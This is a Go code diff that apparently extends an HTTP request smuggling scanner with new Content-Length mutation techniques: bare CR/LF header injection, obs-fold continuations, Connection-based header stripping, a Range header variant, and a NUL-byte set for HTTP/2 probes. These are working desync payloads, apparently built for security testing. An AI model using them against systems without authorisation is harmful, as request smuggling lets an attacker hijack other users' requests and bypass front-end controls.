@@ -595,6 +595,57 @@ func ApplyCL(req []byte, technique, clValue string) []byte {
 		// back-end that takes the LAST (=0) treats body as next request → CL.0.
 		return replaceBytes(req, []byte(clHeader+clValue), []byte(clHeader+clValue+"\r\nContent-Length: 0"))
 
+	// ── Header injection / obs-fold techniques ──────────────────────────────
+	// Source: Burp Suite HTTP Request Smuggler CL.0 scanner (observed payloads).
+	// These techniques inject the Content-Length via a preceding header's value
+	// using parser confusion from bare CR/LF or RFC 7230 obs-fold sequences.
+	case "CL-none":
+		// Remove Content-Length entirely — body present with no CL declared.
+		// The back-end must infer body length from context; many treat it as CL=0
+		// and leave the body bytes in the TCP buffer → true CL.0.
+		clLine := []byte(clHeader + clValue + "\r\n")
+		return bytes.Replace(req, clLine, nil, 1)
+	case "CL-connection-strip":
+		// Connection: Content-Length — lists CL as hop-by-hop.
+		// A stripping proxy removes the CL header before forwarding; the back-end
+		// receives a request with a body but no CL → treats it as CL.0.
+		return replaceBytes(req, []byte(clHeader+clValue),
+			[]byte("Connection: Content-Length\r\n"+clHeader+clValue))
+	case "CL-badsetupCR":
+		// Foo: bar\rContent-Length: <n>
+		// Bare CR in a preceding header's value. Some parsers treat \r as a line
+		// terminator, splitting the line into "Foo: bar" + "Content-Length: <n>".
+		return replaceBytes(req, []byte(clHeader+clValue),
+			[]byte("Foo: bar\r"+clHeader+clValue))
+	case "CL-badsetupLF":
+		// Foo: bar\nContent-Length: <n>
+		// Same as CL-badsetupCR but with a bare LF instead of CR.
+		return replaceBytes(req, []byte(clHeader+clValue),
+			[]byte("Foo: bar\n"+clHeader+clValue))
+	case "CL-0dwrap":
+		// Foo: bar\r\n\rContent-Length: <n>
+		// CRLF + bare CR before CL. The bare CR after the fold tricks parsers that
+		// normalise CR to LF into treating the CL as a standalone header line.
+		return replaceBytes(req, []byte(clHeader+clValue),
+			[]byte("Foo: bar\r\n\r"+clHeader+clValue))
+	case "CL-nameprefix1":
+		// Foo: bar\r\n Content-Length: <n>  (obs-fold with space)
+		// RFC 7230 §3.2.6 obs-fold: a line starting with SP/HTAB is a continuation
+		// of the previous header. Some servers still honour obs-fold and join the
+		// lines; others see CL as a new header → discrepancy.
+		return replaceBytes(req, []byte(clHeader+clValue),
+			[]byte("Foo: bar\r\n "+clHeader+clValue))
+	case "CL-nameprefix2":
+		// Foo: bar\r\n\tContent-Length: <n>  (obs-fold with tab)
+		return replaceBytes(req, []byte(clHeader+clValue),
+			[]byte("Foo: bar\r\n\t"+clHeader+clValue))
+	case "CL-range":
+		// Add Range: bytes=0-0 after the Content-Length header.
+		// Some caches/proxies use Range to split the response; combined with a
+		// body-bearing request it can expose CL.0 on range-aware intermediaries.
+		return replaceBytes(req, []byte(clHeader+clValue),
+			[]byte(clHeader+clValue+"\r\nRange: bytes=0-0"))
+
 	// ── CLZero-derived static mutations ─────────────────────────────────────
 	// Source: github.com/Moopinger/CLZero/blob/main/configs/default.py
 	case "CL-alpha":
@@ -775,12 +826,22 @@ func CLZeroBytes() []int {
 	return []int{0x01, 0x04, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x1f, 0x20, 0x7f, 0xa0, 0xff}
 }
 
-// specialChars returns the set of byte values used for dynamic TE permutations.
+// SpecialChars returns the set of byte values used for dynamic TE permutations.
 // Expanded to match the full set used by github.com/amirnsahmad/smuggler and
-// github.com/Moopinger/CLZero — 13 bytes that trigger parsing discrepancies
+// github.com/Moopinger/CLZero — 14 bytes that trigger parsing discrepancies
 // in various proxies and back-end servers.
 //
+// Includes 0x00 (NUL) which Burp's HTTP/2 probe uses for H2-specific
+// transfer-encoding name/value mutations via HPACK.
+//
 // Original Java DesyncBox set (6 bytes) is a strict subset of this list.
+func SpecialChars() []int {
+	return append([]int{0x00}, CLZeroBytes()...)
+}
+
+// specialChars is an unexported alias kept for internal H1 TE permutations.
+// H1 NUL-byte variants are excluded (most servers reject NUL in headers at the
+// TCP/TLS layer), so it omits 0x00 and uses only CLZeroBytes.
 func specialChars() []int {
 	return CLZeroBytes()
 }
